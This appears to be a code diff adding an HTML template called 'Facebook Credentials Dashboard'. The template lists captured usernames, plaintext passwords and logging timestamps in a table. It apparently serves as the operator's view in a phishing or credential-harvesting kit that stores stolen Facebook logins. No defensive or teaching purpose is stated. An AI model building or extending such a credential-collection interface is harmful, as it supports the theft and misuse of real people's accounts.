@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Facebook Credentials Dashboard</title>
+	</head>
+
+	<body>
+		<table>
+			<thead>
+				<tr>
+					<td>Username</td>
+					<td>Password</td>
+					<td>Timestamp</td>
+				</tr>
+			</thead>
+
+			<tbody>
+				{% for cred in credentials %}
+					<tr>
+						<td>{{ cred.username }}</td>
+						<td>{{ cred.password }}</td>
+						<td>{{ cred.logged_timestamp }}</td>
+					</tr>
+				{% endfor %}
+			</tbody>
+		</table>
+	</body>
+</html>
